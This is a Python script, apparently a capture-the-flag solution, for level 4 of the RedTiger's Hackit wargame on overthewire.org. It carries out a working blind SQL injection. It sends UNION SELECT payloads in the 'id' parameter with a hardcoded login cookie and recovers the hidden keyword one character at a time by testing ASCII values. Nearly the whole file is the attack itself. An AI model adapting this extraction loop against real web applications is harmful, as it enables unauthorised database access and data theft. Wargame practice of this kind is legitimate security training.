#!/usr/bin/env python3

import requests

from string import printable

url = "https://redtiger.labs.overthewire.org/level4.php"
cookies = {'level4login' : 'put_the_kitten_on_your_head' }

result = ''

for x in range(1, 22):
    for i in printable:
        params = {'id' : '1 UNION SELECT keyword, 1 FROM level4_secret WHERE ascii(substring(keyword,%i,1))= %i'% (x,ord(i))}
        response = requests.get(url, params = params, cookies = cookies)
        if "2 rows" in response.text:
            result += i
            break
    print(result)